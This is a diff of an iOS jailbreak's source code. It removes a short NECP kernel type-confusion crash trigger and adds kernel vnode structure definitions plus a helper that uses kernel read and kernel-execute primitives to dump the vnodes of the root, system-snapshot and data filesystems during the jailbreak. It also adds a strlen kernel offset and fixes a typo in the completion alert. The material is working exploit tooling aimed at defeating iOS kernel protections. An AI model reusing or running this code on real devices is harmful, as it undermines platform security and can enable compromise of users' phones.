@@ -561,19 +561,6 @@ out:
     return vnode;
 }
 
-// https://blogs.projectmoon.pw/2018/11/30/A-Late-Kernel-Bug-Type-Confusion-in-NECP/NECPTypeConfusion.c
-
-int necp_die() {
-    int necp_fd = syscall(SYS_necp_open, 0);
-    if (necp_fd < 0) {
-        LOG("Create NECP client failed!");
-        return 0;
-    }
-    LOG("NECP client = %d", necp_fd);
-    syscall(SYS_necp_session_action, necp_fd, 1, 0x1234, 0x5678);
-    return 0;
-}
-
 #define IO_ACTIVE 0x80000000
 
 #define IKOT_HOST 3
@@ -655,6 +642,110 @@ bool load_prefs(prefs_t *prefs, NSDictionary *defaults) {
     prefs->exploit = [defaults[K_EXPLOIT] intValue];
     return true;
 }
+
+struct tqe_struct {
+    uint64_t tqe_next;
+    uint64_t tqe_prev;
+};
+struct tqh_struct {
+    uint64_t tqh_first;
+    uint64_t tqh_last;
+};
+
+struct vnode_struct {
+    uint64_t v_lock[2];
+    struct tqe_struct v_freelist;
+    struct tqe_struct v_mntvnodes;
+    struct tqh_struct v_ncchildren;
+    uint64_t v_nclinks;
+    uint64_t v_defer_reclaimlist;
+    uint32_t v_listflag;            /* flags protected by the vnode_list_lock (see below) */
+    uint32_t v_flag;            /* vnode flags (see below) */
+    uint16_t v_lflag;            /* vnode local and named ref flags */
+    uint8_t     v_iterblkflags;        /* buf iterator flags */
+    uint8_t     v_references;            /* number of times io_count has been granted */
+    int32_t     v_kusecount;            /* count of in-kernel refs */
+    int32_t     v_usecount;            /* reference count of users */
+    int32_t     v_iocount;            /* iocounters */
+    uint64_t   v_owner;            /* void * act that owns the vnode */
+    uint16_t v_type;            /* vnode type */
+    uint16_t v_tag;                /* type of underlying data */
+    uint32_t v_id;                /* identity of vnode contents */
+    union {
+        struct mount    *vu_mountedhere;/* ptr to mounted vfs (VDIR) */
+        struct socket    *vu_socket;    /* unix ipc (VSOCK) */
+        struct specinfo    *vu_specinfo;    /* device (VCHR, VBLK) */
+        struct fifoinfo    *vu_fifoinfo;    /* fifo (VFIFO) */
+        struct ubc_info *vu_ubcinfo;    /* valid for (VREG) */
+    } v_un;
+    uint64_t v_cleanblkhd;        /* clean blocklist head */
+    uint64_t v_dirtyblkhd;        /* dirty blocklist head */
+    uint64_t v_knotes;            /* knotes attached to this vnode */
+    /*
+     * the following 4 fields are protected
+     * by the name_cache_lock held in
+     * excluive mode
+     */
+    uint64_t    v_cred;            /* last authorized credential */
+    uint64_t    v_authorized_actions;    /* current authorized actions for v_cred */
+    int        v_cred_timestamp;    /* determine if entry is stale for MNTK_AUTH_OPAQUE */
+    int        v_nc_generation;    /* changes when nodes are removed from the name cache */
+    /*
+     * back to the vnode lock for protection
+     */
+    int32_t        v_numoutput;            /* num of writes in progress */
+    int32_t        v_writecount;            /* reference count of writers */
+    const char *v_name;            /* name component of the vnode */
+    uint64_t v_parent;            /* pointer to parent vnode */
+    struct lockf *v_lockf;        /* advisory lock list head */
+    int     (**v_op)(void *);        /* vnode operations vector */
+    mount_t v_mount;            /* ptr to vfs we are in */
+    void *    v_data;                /* private data for fs */
+} ;
+
+
+size_t kstrlen(uint64_t strptr) {
+    return (size_t)kexecute(GETOFFSET(strlen), strptr, 0, 0, 0, 0, 0, 0);
+}
+
+void show_vnode(uint64_t vp) {
+    struct vnode_struct vnode;
+    kread(vp, &vnode, sizeof(struct vnode_struct));
+    size_t pathlen = kstrlen((uint64_t)vnode.v_name);
+    char name[pathlen+1];
+    
+    kread((uint64_t)vnode.v_name, name, pathlen);
+    printf("VID: %d name: %s v_mount: %p v_data: %p\n", vnode.v_id, name, vnode.v_mount, vnode.v_data);
+    printf("\tv_defer_reclaimlist: %p, v_listflag: %x, v_flag: %x",
+           (void*)vnode.v_defer_reclaimlist, vnode.v_listflag, vnode.v_flag);
+    printf("\tHexdump:");
+    for (int i=0; i<sizeof(struct vnode_struct); i++) {
+        if (i%16==0)
+            printf("\n\t");
+        else if (i%8==0)
+            printf(" ");
+        
+        printf("%02x", *(((unsigned char*)&vnode)+i));
+    }
+    printf("\n");
+}
+
+enum mockfs_fsnode_type {
+    MOCKFS_ROOT,
+    MOCKFS_DEV,
+    MOCKFS_FILE
+};
+
+struct mockfs_fsnode_struct {
+    uint64_t               size;    /* Bytes of data; 0 unless type is MOCKFS_FILE */
+    uint8_t                type;    /* Serves as a unique identifier for now */
+    mount_t                mnt;     /* The mount that this node belongs to */
+    vnode_t                vp;      /* vnode for this node (if one exists) */
+    struct mockfs_fsnode * parent;  /* Parent of this node (NULL for root) */
+    /* TODO: Replace child_a/child_b with something more flexible */
+    struct mockfs_fsnode * child_a; /* TEMPORARY */
+    struct mockfs_fsnode * child_b; /* TEMPORARY */
+};
 
 void jailbreak()
 {
@@ -834,6 +925,7 @@ void jailbreak()
         FIND(shenanigans);
         FIND(lck_mtx_lock);
         FIND(lck_mtx_unlock);
+        FIND(strlen);
 #undef FIND
         LOG("Successfully found offsets.");
     }
@@ -1120,6 +1212,21 @@ void jailbreak()
             }
             char *systemSnapshot = copySystemSnapshot();
             _assert(systemSnapshot != NULL, message, true);
+            uint64_t rootfs_vnode = vnodeFor("/");
+            LOG("rootfs_vnode = "ADDR"", rootfs_vnode);
+            _assert(ISADDR(rootfs_vnode), message, true);
+            show_vnode(rootfs_vnode);
+            _assert(_vnode_put(rootfs_vnode) == ERR_SUCCESS, message, true);
+            uint64_t real_rootfs_vnode = vnodeFor(systemSnapshotMountPoint);
+            LOG("real_rootfs_vnode = "ADDR"", real_rootfs_vnode);
+            _assert(ISADDR(real_rootfs_vnode), message, true);
+            show_vnode(real_rootfs_vnode);
+            _assert(_vnode_put(real_rootfs_vnode) == ERR_SUCCESS, message, true);
+            uint64_t datafs_vnode = vnodeFor("/private/var");
+            LOG("datafs_vnode = "ADDR"", datafs_vnode);
+            _assert(ISADDR(datafs_vnode), message, true);
+            show_vnode(datafs_vnode);
+            _assert(_vnode_put(datafs_vnode) == ERR_SUCCESS, message, true);
             _assert(fs_snapshot_rename(rootfd, systemSnapshot, origfs, 0) == ERR_SUCCESS, message, true);
             free(systemSnapshot);
             systemSnapshot = NULL;
@@ -1419,6 +1526,7 @@ void jailbreak()
         dictionary[@"Shenanigans"] = ADDRSTRING(GETOFFSET(shenanigans));
         dictionary[@"LckMtxLock"] = ADDRSTRING(GETOFFSET(lck_mtx_lock));
         dictionary[@"LckMtxUnlock"] = ADDRSTRING(GETOFFSET(lck_mtx_unlock));
+        dictionary[@"Strlen"] = ADDRSTRING(GETOFFSET(strlen));
         if (![[NSMutableDictionary dictionaryWithContentsOfFile:@"/jb/offsets.plist"] isEqual:dictionary]) {
             // Log offsets.
             
@@ -1962,7 +2070,7 @@ void jailbreak()
 out:
     if (isv1ntex && !prefs.export_kernel_task_port) make_host_priv_into_host();
     STATUS(NSLocalizedString(@"Jailbroken", nil), false, false);
-    showAlert(@"Jailbreak Completed", [NSString stringWithFormat:@"%@\n\n%@\n%@", NSLocalizedString(@"Jailbreak Completed With Status:", nil), status, NSLocalizedString(@"The app will now exit.", nil)], true, false);
+    showAlert(@"Jailbreak Completed", [NSString stringWithFormat:@"%@\n\n%@\n%@", NSLocalizedString(@"Jailbreak Completed with Status:", nil), status, NSLocalizedString(@"The app will now exit.", nil)], true, false);
     exit(EXIT_SUCCESS);
 }
 
